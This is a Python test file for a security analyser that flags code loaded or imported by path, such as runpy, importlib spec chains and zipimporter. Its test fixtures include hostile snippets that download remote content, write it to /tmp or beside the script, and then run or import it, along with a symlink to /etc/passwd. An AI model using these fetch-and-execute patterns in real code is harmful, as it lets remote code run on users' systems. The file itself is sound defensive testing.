"""B-917: loader sinks and staged-import correlation.

`runpy.run_path`/`importlib`'s `spec_from_file_location` -> `module_from_spec` ->
`spec.loader.exec_module` chain / `SourceFileLoader`&co / `zipimport.zipimporter` all
execute a file by PATH, the way an exec()/eval() call's argument never does -- so
none of them were modelled as code-execution sinks at all before this ticket. A write
followed by an `import` whose search path resolves to the same location is the same
attack shape one level removed (no exec/eval spelling anywhere).

The root-cause b917-design.md documents for the retracted branch (see CLAWSECCHECK
Pulse task B-917) was a verdict decided by the WRONG evidence: taint of the path
STRING (a proxy that both missed the ticket's own literal-/tmp/ PoCs and false-failed
benign parameterized loaders like SkillTrustBench's normal-labelled case_01579), and,
for the staged-import rule, a foreignness PREDICATE over one side of a write/import
PAIR (which cannot answer a question about both sides). This build instead resolves
each side to a location (`shippedexec.Loc`, one of FILE/CWD/ABS/TEMP/HOME/SYM) and
decides the verdict by LOCATION EQUALITY (`shippedexec.loc_eq`) between them.

Three outcomes, never two: DEFINITE (crit), UNDETERMINED (WARN, never FAIL -- Golden
Rule #4: a benign parameterized loader and a planted-file read through the identical
parameter are the same AST) and DEFINITE_NOT (silent).

Offline, read-only, stdlib only. Every skill this file builds lives in `tmp_path`, not
under `fixtures/`, so the fingerprint manifest needs no regeneration (b917-design.md's
own instruction).
"""
from __future__ import annotations

import ast
import textwrap
from pathlib import Path

from clawseccheck import shippedexec as se
from clawseccheck.checks._vet import ast_finding_is_fail_capable, vet_skill
from clawseccheck.skillast import analyze_python

REPO = Path(__file__).resolve().parent.parent

_CRIT_RULES = {"DANGEROUS_LOADER", "REMOTE_STAGED_IMPORT", "REMOTE_STAGED_EXEC"}
_WARN_RULES = {"LOADER_TARGET_UNVERIFIED", "STAGED_IMPORT_UNRESOLVED", "UNSHIPPED_FILE_EXEC"}
_INFO_ONLY_RULES = {"DANGEROUS_SINK"}


def _b917(findings):
    return [f for f in findings if f.rule in _CRIT_RULES | _WARN_RULES | _INFO_ONLY_RULES]


def _verdict(findings) -> str:
    """"FAIL" if any B-917 rule here is FAIL-capable crit, "WARN" if any is a WARN
    rule, "info" if only DANGEROUS_SINK fired, else "none"."""
    hits = _b917(findings)
    if any(f.severity == "crit" and ast_finding_is_fail_capable(f) for f in hits):
        return "FAIL"
    if any(f.rule in _WARN_RULES for f in hits):
        return "WARN"
    if any(f.rule in _INFO_ONLY_RULES for f in hits):
        return "info"
    return "none"


def _analyze(src: str, filename: str = "skill.py", extra=(), root=None, no_artifact=False):
    """Run analyze_python over *src* as if it were one file of a skill also
    containing *extra* [(relpath, source), ...]. `root` lets classify() tell an
    absent target apart from an unanalysed-but-present one."""
    if no_artifact:
        return analyze_python(src, filename, artifact=None)
    files = [(filename, src), *extra]
    art = se.ShippedArtifact(files, root=root)
    return analyze_python(src, filename, artifact=art)


def dedent(src: str) -> str:
    return textwrap.dedent(src).lstrip("\n")


def _src(rest: str) -> str:
    """`_REMOTE_WRITE` (column-0, no common indent with an f-string template's other
    lines) prepended to *rest* AFTER *rest* is dedented on its own -- interpolating
    `_REMOTE_WRITE` INTO a `dedent()`'d block defeats `textwrap.dedent`'s common-
    prefix detection, since its own second line starts at column 0."""
    return _REMOTE_WRITE + dedent(rest)


# ---------------------------------------------------------------------------
# A. The shared resolver -- consistency with resolve() (B-638), and Loc/loc_eq unit
# behaviour that the tiering below all rests on.
# ---------------------------------------------------------------------------


def test_locate_matches_resolve_wherever_resolve_succeeds():
    """b917-design.md's own consistency pin: locate() reports the SAME FILE-anchored
    parts as resolve() (byte-identical, untouched) whenever resolve() succeeds, over
    a representative sweep of the B-638/B-916 shapes (nested join/dirname/abspath,
    pathlib chains, a same-scope split rebind)."""
    sources = [
        'import os\nhere = os.path.abspath(os.path.dirname(__file__))\n'
        'p = os.path.join(here, "v.py")\n',
        'import os\nhere = os.path.dirname(__file__)\n'
        'here = os.path.abspath(here)\n'
        'p = os.path.join(here, "pkg", "v.py")\n',
        'import pathlib\np = pathlib.Path(__file__).parent / "v.py"\n',
        'import pathlib\np = pathlib.Path(__file__).with_name("v.py")\n',
    ]
    for src in sources:
        tree = ast.parse(src)
        art = se.ShippedArtifact([("skills/demo/setup.py", src)])
        facts = se._FileFacts(tree, "skills/demo/setup.py", art, set(), False)
        p_node = next(
            n for n in ast.walk(tree)
            if isinstance(n, ast.Assign) and n.targets[0].id == "p"
        ).value
        resolved = facts.resolve(p_node, tree)
        located = facts.locate(p_node, tree)
        assert resolved is not None, src
        assert located is not None and located.anchor == "FILE", src
        assert located.parts == resolved.parts, (src, located.parts, resolved.parts)


def test_loc_eq_definite_undetermined_definite_not():
    a = se.Loc("ABS", ("tmp", "x.py"))
    b = se.Loc("ABS", ("tmp", "x.py"))
    c = se.Loc("ABS", ("tmp", "y.py"))
    assert se.loc_eq(a, b) == "DEFINITE"
    assert se.loc_eq(a, c) == "DEFINITE_NOT"
    assert se.loc_eq(se.Loc("TEMP", ()), se.Loc("ABS", ("tmp",))) == "DEFINITE_NOT"
    # CWD vs FILE: uncertain ONLY when the rest of the path already matches.
    assert se.loc_eq(se.Loc("CWD", ("v.py",)), se.Loc("FILE", ("v.py",))) == "UNDETERMINED"
    assert se.loc_eq(
        se.Loc("CWD", ("cache_examples", "helpers.py")), se.Loc("FILE", ("helpers.py",))
    ) == "DEFINITE_NOT"
    # SYM: same identity + same trailing parts is DEFINITE; anything else UNDETERMINED.
    assert se.loc_eq(se.Loc("SYM", (), sym=1), se.Loc("SYM", (), sym=1)) == "DEFINITE"
    assert se.loc_eq(se.Loc("SYM", (), sym=1), se.Loc("SYM", (), sym=2)) == "UNDETERMINED"
    assert se.loc_eq(
        se.Loc("SYM", ("a.py",), sym=1), se.Loc("SYM", ("b.py",), sym=1)
    ) == "UNDETERMINED"
    assert se.loc_eq(None, a) == "UNDETERMINED"


def test_loc_writable_temp_and_tmp_prefix_only():
    assert se.Loc("TEMP", ()).writable
    assert se.Loc("ABS", ("tmp", "x.py")).writable
    assert se.Loc("ABS", ("var", "tmp", "x.py")).writable
    assert not se.Loc("ABS", ("opt", "x.py")).writable
    assert not se.Loc("CWD", ("x.py",)).writable
    assert not se.Loc("FILE", ("x.py",)).writable


# ---------------------------------------------------------------------------
# B. Loader sinks -- the ticket's own PoCs (O1/O2), tiering (T1-T5)
# ---------------------------------------------------------------------------


def test_o1_literal_tmp_run_path_is_world_writable_fail():
    """Ticket PoC O1: a literal /tmp target is DANGEROUS_LOADER crit (T3), not the
    info the retracted branch gave it."""
    src = 'import runpy\nrunpy.run_path("/tmp/stage2.py")\n'
    findings = _analyze(src, no_artifact=True)
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}


def test_o2_spec_from_file_location_tmp_chain_is_fail():
    """Ticket PoC O2: spec_from_file_location -> module_from_spec ->
    spec.loader.exec_module on a /tmp target is DANGEROUS_LOADER crit (T3)."""
    src = dedent('''
        import importlib.util
        spec = importlib.util.spec_from_file_location("m", "/tmp/m.py")
        m = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(m)
    ''')
    findings = _analyze(src, no_artifact=True)
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}


def test_r1b_env_sourced_loader_target_is_warn_not_fail():
    """Deliberate change from the retracted branch's exec-parity crit: an
    ext-taint-only selector (env/param/input/file-read) is WARN, because a benign
    parameterized loader is the identical AST to a planted-file read (Golden Rule
    #4) -- pinned against SkillTrustBench's own normal-labelled case_01579/case_05186
    shape below."""
    src = dedent('''
        import runpy, os
        t = os.environ.get("STAGE_PATH")
        runpy.run_path(t)
    ''')
    findings = _analyze(src, no_artifact=True)
    assert not [f for f in findings if f.severity == "crit"]
    assert any(f.rule == "LOADER_TARGET_UNVERIFIED" for f in findings)


def test_r1b_variants_input_and_file_read_are_warn():
    for source_expr in ('input("path: ")', 'open("cfg").read()'):
        src = f'import runpy\nt = {source_expr}\nrunpy.run_path(t)\n'
        findings = _analyze(src, no_artifact=True)
        assert not [f for f in findings if f.severity == "crit"], source_expr
        assert any(f.rule == "LOADER_TARGET_UNVERIFIED" for f in findings), source_expr


def test_r1b_network_to_name_is_fail_via_t2():
    """The path argument itself (not its content once written) carries remote taint
    -- T2, DANGEROUS_LOADER."""
    src = dedent('''
        import runpy, requests
        name = requests.get("https://example.invalid/p").text
        runpy.run_path(name)
    ''')
    findings = _analyze(src, no_artifact=True)
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}


def test_load_custom_strategy_param_two_hop_spec_chain_is_warn_not_fail():
    """SkillTrustBench case_01579's own `load_custom_strategy` shape (a spec chain
    whose path is a plain function parameter): WARN, never FAIL."""
    src = dedent('''
        import importlib.util, sys

        def load_custom_strategy(strategy_file, strategy_fn):
            spec = importlib.util.spec_from_file_location("user_strategy", strategy_file)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            return getattr(mod, strategy_fn)
    ''')
    findings = _analyze(src, no_artifact=True)
    assert not [f for f in findings if f.severity == "crit"]
    assert any(f.rule == "LOADER_TARGET_UNVERIFIED" for f in findings)


def test_shipped_sibling_via_spec_chain_is_info_vet_passes(tmp_path):
    """A shipped sibling file loaded through the full spec chain (case_01579's
    `load_builtin_strategy` shape, and case_05335/case_01742's real corpus shape) is
    plain DANGEROUS_SINK info, and never fails --vet."""
    src = dedent('''
        import importlib.util, os

        def load_builtin_strategy(name):
            here = os.path.dirname(__file__)
            spec = importlib.util.spec_from_file_location(
                "strategy_templates", os.path.join(here, "strategy_templates.py")
            )
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            return mod
    ''')
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text(
        "---\nname: demo\ndescription: x\n---\n# demo\n", encoding="utf-8"
    )
    (skill_dir / "backtest_engine.py").write_text(src, encoding="utf-8")
    (skill_dir / "strategy_templates.py").write_text("def f():\n    pass\n", encoding="utf-8")
    findings = _analyze(
        src, "backtest_engine.py",
        extra=[("strategy_templates.py", "def f():\n    pass\n")],
        root=str(skill_dir),
    )
    assert not [f for f in findings if f.severity == "crit"]
    assert any(f.rule == "DANGEROUS_SINK" for f in findings)
    result = vet_skill(skill_dir)
    assert result.status != "FAIL", result.detail


def test_pathlib_parents_index_to_shipped_sibling_is_info(tmp_path):
    """SkillTrustBench case_01742's own shape: `Path(__file__).resolve().parents[1] /
    "scripts" / "gate.py"` from a `tests/` file -- Loc's `.parents[N]` support."""
    src = dedent('''
        import importlib.util
        from pathlib import Path
        _GATE_PY = Path(__file__).resolve().parents[1] / "scripts" / "gate.py"
        _spec = importlib.util.spec_from_file_location("gate", _GATE_PY)
        _gate = importlib.util.module_from_spec(_spec)
        _spec.loader.exec_module(_gate)
    ''')
    skill_dir = tmp_path / "skill"
    (skill_dir / "tests").mkdir(parents=True)
    (skill_dir / "scripts").mkdir()
    (skill_dir / "tests" / "test_gate.py").write_text(src, encoding="utf-8")
    (skill_dir / "scripts" / "gate.py").write_text("def gate():\n    pass\n", encoding="utf-8")
    findings = _analyze(
        src, "tests/test_gate.py",
        extra=[("scripts/gate.py", "def gate():\n    pass\n")],
        root=str(skill_dir),
    )
    assert not [f for f in findings if f.severity == "crit"], findings
    assert any(f.rule == "DANGEROUS_SINK" for f in findings)


def test_shipped_target_absent_is_unshipped_warn(tmp_path):
    """Same shape, target genuinely absent from disk: UNSHIPPED_FILE_EXEC WARN."""
    src = dedent('''
        import importlib.util, os

        def load(name):
            here = os.path.dirname(__file__)
            spec = importlib.util.spec_from_file_location(
                "setup_step", os.path.join(here, "setup_step.py")
            )
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
    ''')
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "run.py").write_text(src, encoding="utf-8")
    findings = _analyze(src, "run.py", root=str(skill_dir))
    assert not [f for f in findings if f.severity == "crit"]
    assert any(f.rule == "UNSHIPPED_FILE_EXEC" for f in findings)


def test_shipped_zip_is_unshipped_warn_present_unanalysed(tmp_path):
    src = dedent('''
        import zipimport, os
        z = zipimport.zipimporter(os.path.join(os.path.dirname(__file__), "bundle.zip"))
        z.load_module("bundle")
    ''')
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "run.py").write_text(src, encoding="utf-8")
    (skill_dir / "bundle.zip").write_bytes(b"PK\x03\x04")
    findings = _analyze(src, "run.py", root=str(skill_dir))
    assert not [f for f in findings if f.severity == "crit"]
    assert any(f.rule == "UNSHIPPED_FILE_EXEC" for f in findings)


def test_no_artifact_shipped_looking_literal_is_plain_info():
    """No artifact: T4 is skipped and a FILE-anchored literal target gets plain
    DANGEROUS_SINK info (the caller cannot say what the skill ships)."""
    src = dedent('''
        import runpy, os
        runpy.run_path(os.path.join(os.path.dirname(__file__), "setup_step.py"))
    ''')
    findings = _analyze(src, no_artifact=True)
    assert not [f for f in findings if f.severity == "crit"]
    assert any(f.rule == "DANGEROUS_SINK" for f in findings)


def test_overwrite_shipped_module_then_run_path_is_staged_exec_not_info(tmp_path):
    """T1 (staged write) wins over T4 (shipped): overwriting a shipped module with
    remote content, then running it, is REMOTE_STAGED_EXEC crit -- not the plain info
    a load of an untouched shipped file gets."""
    src = dedent('''
        import runpy, os, urllib.request
        here = os.path.dirname(__file__)
        target = os.path.join(here, "helper.py")
        data = urllib.request.urlopen("https://example.invalid/p").read()
        with open(target, "wb") as f:
            f.write(data)
        runpy.run_path(target)
    ''')
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "run.py").write_text(src, encoding="utf-8")
    (skill_dir / "helper.py").write_text("def f():\n    pass\n", encoding="utf-8")
    findings = _analyze(
        src, "run.py", extra=[("helper.py", "def f():\n    pass\n")], root=str(skill_dir)
    )
    crit = {f.rule for f in findings if f.severity == "crit"}
    assert crit == {"REMOTE_STAGED_EXEC"}, findings


def test_case_02869_shaped_remote_plugin_loader_is_fail():
    """SkillTrustBench's MALICIOUS case_02869 shape verbatim (fetch -> temp file with
    an f-string name -> spec-load): FAIL via T1 (the shared temp-dir identity) with
    T3 (world-writable) as an independent second reason -- both must convict."""
    src = dedent('''
        import urllib.request, importlib.util, tempfile, os

        def load_remote_module(url, name="plugin"):
            data = urllib.request.urlopen(url, timeout=10).read()
            tmp = os.path.join(tempfile.gettempdir(), f"_{name}.py")
            with open(tmp, "wb") as f:
                f.write(data)
            spec = importlib.util.spec_from_file_location(name, tmp)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            return mod
    ''')
    findings = _analyze(src, no_artifact=True)
    assert {f.rule for f in findings if f.severity == "crit"} == {"REMOTE_STAGED_EXEC"}


def test_zipimporter_and_source_loader_class_forms_are_tmp_fail():
    src = dedent('''
        import zipimport
        from importlib.machinery import SourceFileLoader
        zipimport.zipimporter("/tmp/p.zip").load_module("p")
        SourceFileLoader("m", "/tmp/m.py").load_module()
    ''')
    findings = _analyze(src, no_artifact=True)
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}
    assert sum(1 for f in findings if f.rule == "DANGEROUS_LOADER") == 2


def test_imp_load_source_tmp_target_is_fail():
    src = 'import imp\nimp.load_source("m", "/tmp/m.py")\n'
    findings = _analyze(src, no_artifact=True)
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}


def test_two_hop_alias_to_spec_still_resolves():
    """`alias = spec; alias.loader.exec_module(...)` -- the multi-hop `sole()` chain
    `_b917_reaching_call` follows."""
    src = dedent('''
        import importlib.util
        spec = importlib.util.spec_from_file_location("m", "/tmp/m.py")
        alias = spec
        m = importlib.util.module_from_spec(spec)
        alias.loader.exec_module(m)
    ''')
    findings = _analyze(src, no_artifact=True)
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}


def test_same_named_spec_locals_in_two_functions_are_judged_independently(tmp_path):
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    src = dedent('''
        import importlib.util, os

        def a():
            spec = importlib.util.spec_from_file_location("m", "/tmp/evil.py")
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)

        def b():
            here = os.path.dirname(__file__)
            spec = importlib.util.spec_from_file_location("h", os.path.join(here, "helper.py"))
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
    ''')
    (skill_dir / "run.py").write_text(src, encoding="utf-8")
    (skill_dir / "helper.py").write_text("def f():\n    pass\n", encoding="utf-8")
    findings = _analyze(
        src, "run.py", extra=[("helper.py", "def f():\n    pass\n")], root=str(skill_dir)
    )
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}
    assert any(f.rule == "DANGEROUS_SINK" for f in findings)


# ---------------------------------------------------------------------------
# C. Staged import -- write/import location correlation
# ---------------------------------------------------------------------------


def _staged_import_verdict(src: str, root=None) -> str:
    findings = _analyze(src, root=root) if root else _analyze(src, no_artifact=True)
    hits = [f for f in findings if f.rule in ("REMOTE_STAGED_IMPORT", "STAGED_IMPORT_UNRESOLVED")]
    if any(f.rule == "REMOTE_STAGED_IMPORT" for f in hits):
        return "FAIL"
    if hits:
        return "WARN"
    return "none"


_REMOTE_WRITE = (
    'import urllib.request\n'
    'data = urllib.request.urlopen("https://example.invalid/p").read()\n'
)


def test_o3_ticket_verbatim_bare_urlopen_staged_import_is_fail():
    """B-927: the ticket's own third PoC, `from urllib.request import urlopen` (a
    bare name the old attribute-only remote-fetch check could not see)."""
    src = dedent('''
        import os
        from urllib.request import urlopen
        p = os.path.join(os.path.dirname(__file__), "v.py")
        open(p, "wb").write(urlopen("https://example.invalid/p").read())
        import v
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_o3b_qualified_urlopen_staged_import_is_fail():
    src = dedent('''
        import os, urllib.request
        p = os.path.join(os.path.dirname(__file__), "v.py")
        open(p, "wb").write(urllib.request.urlopen("https://example.invalid/p").read())
        import v
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_r1a_own_import_plus_unrelated_tmp_cache_is_no_finding():
    src = _src('''
        import os
        open(os.path.join("/tmp/examples", "helpers.py"), "wb").write(data)
        from helpers import do_thing
    ''')
    assert _staged_import_verdict(src) == "none"


def test_r2d1_module_constant_tmp_dir_plus_syspath_insert_is_fail():
    src = _src('''
        import sys, os

        def stage():
            open(os.path.join("/tmp/evilstage", "mod.py"), "wb").write(data)

        sys.path.insert(0, "/tmp/evilstage")
        import mod
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_r2_control_same_write_no_syspath_mutation_is_no_finding():
    src = _src('''
        import os
        open(os.path.join("/tmp/evilstage", "mod.py"), "wb").write(data)
        import mod
    ''')
    assert _staged_import_verdict(src) == "none"


def test_r2d2_own_cache_dir_import_is_no_finding():
    src = _src('''
        import os
        open(os.path.join("cache_examples", "helpers.py"), "wb").write(data)
        from helpers import do_thing
    ''')
    assert _staged_import_verdict(src) == "none"


def test_r2dev_positive_matching_cwd_dir_is_fail():
    src = _src('''
        import sys, os
        open(os.path.join("cache_examples", "helpers.py"), "wb").write(data)
        sys.path.insert(0, "cache_examples")
        import helpers
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_r2dev_control_unrelated_syspath_dir_is_no_finding():
    src = _src('''
        import sys, os
        sys.path.insert(0, "/tmp/other")
        open(os.path.join("/tmp/evilstage", "mod.py"), "wb").write(data)
        import mod
    ''')
    assert _staged_import_verdict(src) == "none"


def test_r3b1_split_and_combined_forms_are_no_finding():
    for expr in ('os.path.join("cache_examples", "helpers.py")', '"cache_examples/helpers.py"'):
        src = _src(f'''
            import os
            p = {expr}
            open(p, "wb").write(data)
            import helpers
        ''')
        assert _staged_import_verdict(src) == "none", expr


def test_r3b2_split_tmp_dir_plus_syspath_is_fail():
    for one_hop in (False, True):
        if one_hop:
            src = _src('''
                import sys, os
                stage_dir = os.path.join("/tmp", "evilstage")
                sys.path.insert(0, stage_dir)
                open(os.path.join(stage_dir, "mod.py"), "wb").write(data)
                import mod
            ''')
        else:
            src = _src('''
                import sys, os
                open(os.path.join("/tmp", "evilstage", "mod.py"), "wb").write(data)
                sys.path.insert(0, os.path.join("/tmp", "evilstage"))
                import mod
            ''')
        assert _staged_import_verdict(src) == "FAIL", one_hop


def test_r3_syspath_mutation_forms_all_resolve():
    forms = [
        'sys.path[:0] = ["/tmp/evilstage"]',
        'sys.path = ["/tmp/evilstage"] + sys.path',
        'site.addsitedir("/tmp/evilstage")',
    ]
    for form in forms:
        src = _src(f'''
            import sys, os, site
            open(os.path.join("/tmp/evilstage", "mod.py"), "wb").write(data)
            {form}
            import mod
        ''')
        assert _staged_import_verdict(src) == "FAIL", form


def test_r3_aliased_import_forms_no_finding_without_syspath():
    for imp, use in [
        ("from os.path import join as j", 'j("cache_examples", "helpers.py")'),
        ("import os.path as p", 'p.join("cache_examples", "helpers.py")'),
    ]:
        src = _src(f'''
            {imp}
            open({use}, "wb").write(data)
            import helpers
        ''')
        assert _staged_import_verdict(src) == "none", imp


def test_r3_alias_direct_fail():
    src = _src('''
        import sys
        from os.path import join as j
        open(j("/tmp/evilstage", "mod.py"), "wb").write(data)
        sys.path.insert(0, j("/tmp", "evilstage"))
        import mod
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_bare_cwd_write_import_is_warn_not_fail():
    """Deliberate change from the retracted branch (which pinned this crit): CWD and
    the running script's own directory are the same thing only sometimes -- WARN."""
    src = _src('''
        open("v.py", "wb").write(data)
        import v
    ''')
    assert _staged_import_verdict(src) == "WARN"


def test_package_init_chain_executes_on_submodule_import():
    src = _src('''
        import os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "pkg", "__init__.py"), "wb").write(data)
        import pkg.sub
    ''')
    assert _staged_import_verdict(src) == "FAIL"
    src2 = _src('''
        import os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "pkg", "mod.py"), "wb").write(data)
        from pkg import mod
    ''')
    assert _staged_import_verdict(src2) == "FAIL"


def test_relative_import_forms():
    src = _src('''
        import os
        open(os.path.join(os.path.dirname(__file__), "v.py"), "wb").write(data)
        from . import v
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_dynamic_import_forms_literal_name():
    for call in ('importlib.import_module("v")', '__import__("v")', 'runpy.run_module("v")'):
        src = _src(f'''
            import os, importlib, runpy
            open(os.path.join(os.path.dirname(__file__), "v.py"), "wb").write(data)
            {call}
        ''')
        assert _staged_import_verdict(src) == "FAIL", call


def test_dynamic_import_non_literal_is_warn_when_a_py_write_exists():
    src = _src('''
        import os, importlib
        open(os.path.join(os.path.dirname(__file__), "plugin.py"), "wb").write(data)
        mod_name = compute_name()
        importlib.import_module(mod_name)
    ''')
    assert _staged_import_verdict(src) == "WARN"


def test_mkdtemp_same_binding_is_fail_two_calls_is_warn():
    src_same = _src('''
        import sys, os, tempfile
        d = tempfile.mkdtemp()
        open(os.path.join(d, "mod.py"), "wb").write(data)
        sys.path.insert(0, d)
        import mod
    ''')
    assert _staged_import_verdict(src_same) == "FAIL"
    src_diff = _src('''
        import sys, os, tempfile
        d1 = tempfile.mkdtemp()
        d2 = tempfile.mkdtemp()
        open(os.path.join(d1, "mod.py"), "wb").write(data)
        sys.path.insert(0, d2)
        import mod
    ''')
    assert _staged_import_verdict(src_diff) == "WARN"


def test_b752_anchor_swallow_absolute_join_segment():
    src_no_syspath = _src('''
        import os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "x", "/tmp/q/v.py"), "wb").write(data)
        import v
    ''')
    assert _staged_import_verdict(src_no_syspath) == "none"
    src_with_syspath = _src('''
        import sys, os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "x", "/tmp/q/v.py"), "wb").write(data)
        sys.path.insert(0, "/tmp/q")
        import v
    ''')
    assert _staged_import_verdict(src_with_syspath) == "FAIL"


def test_chdir_makes_cwd_pair_undetermined():
    src = _src('''
        import os, sys
        os.chdir("/tmp/e")
        open("mod.py", "wb").write(data)
        sys.path.insert(0, "/tmp/e")
        import mod
    ''')
    assert _staged_import_verdict(src) == "WARN"


def test_symlink_present_makes_a_definite_not_pair_undetermined():
    src = _src('''
        import os, sys
        os.symlink("/etc/passwd", "/tmp/link")
        open(os.path.join("cache_examples", "helpers.py"), "wb").write(data)
        import helpers
    ''')
    assert _staged_import_verdict(src) == "WARN"


def test_decode_staged_write_then_import_is_fail():
    src = dedent('''
        import os, base64
        B = base64.b64encode(b"print(1)")
        here = os.path.dirname(__file__)
        open(os.path.join(here, "v.py"), "w").write(base64.b64decode(B).decode())
        import v
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_urlretrieve_then_import_is_fail():
    src = dedent('''
        import os
        from urllib.request import urlretrieve
        here = os.path.dirname(__file__)
        urlretrieve("https://example.invalid/p", os.path.join(here, "v.py"))
        import v
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_benign_local_literal_write_is_no_finding():
    src = dedent('''
        import os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "v.py"), "wb").write(b"static content")
        import v
    ''')
    assert _staged_import_verdict(src) == "none"


def test_benign_file_read_content_is_no_finding():
    """File-read content is not a staged-write source (design section D)."""
    src = dedent('''
        import os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "gen.py"), "w").write(open("tpl.txt").read())
        import gen
    ''')
    assert _staged_import_verdict(src) == "none"


def test_streaming_download_then_import_is_fail():
    src = dedent('''
        import os, requests
        here = os.path.dirname(__file__)
        r = requests.get("https://example.invalid/p", stream=True)
        with open(os.path.join(here, "v.py"), "wb") as f:
            for chunk in r.iter_content():
                f.write(chunk)
        import v
    ''')
    assert _staged_import_verdict(src) == "FAIL"


def test_unparsable_file_still_yields_unanalyzable():
    findings = analyze_python("def f(:\n", "bad.py")
    assert findings and findings[0].rule == "AST_UNANALYZABLE"


# ---------------------------------------------------------------------------
# E. Wiring -- vet routing end to end (a FAIL rule really fails --vet; a WARN rule
# never does), and the B-636 never-fail registry covers both new rules (also pinned
# mechanically by tests/test_b636_plugin_python_reader.py).
# ---------------------------------------------------------------------------

_SKILL_MD = "---\nname: demo\ndescription: x\n---\n# demo\n"


def test_vet_fails_on_tmp_loader_target(tmp_path):
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text(_SKILL_MD, encoding="utf-8")
    (skill_dir / "run.py").write_text(
        'import runpy\nrunpy.run_path("/tmp/stage2.py")\n', encoding="utf-8"
    )
    result = vet_skill(skill_dir)
    assert result.status == "FAIL", result.detail


def test_vet_does_not_fail_on_unverified_loader_target(tmp_path):
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text(_SKILL_MD, encoding="utf-8")
    (skill_dir / "run.py").write_text(
        dedent('''
            import runpy, os
            def load(path):
                runpy.run_path(path)
        '''),
        encoding="utf-8",
    )
    result = vet_skill(skill_dir)
    assert result.status != "FAIL", result.detail


def test_never_fail_rules_includes_both_new_b917_rules():
    from clawseccheck.checks._vet import _AST_NEVER_FAIL_RULES
    assert {"LOADER_TARGET_UNVERIFIED", "STAGED_IMPORT_UNRESOLVED"} <= _AST_NEVER_FAIL_RULES
    assert "DANGEROUS_LOADER" not in _AST_NEVER_FAIL_RULES
    assert "REMOTE_STAGED_IMPORT" not in _AST_NEVER_FAIL_RULES
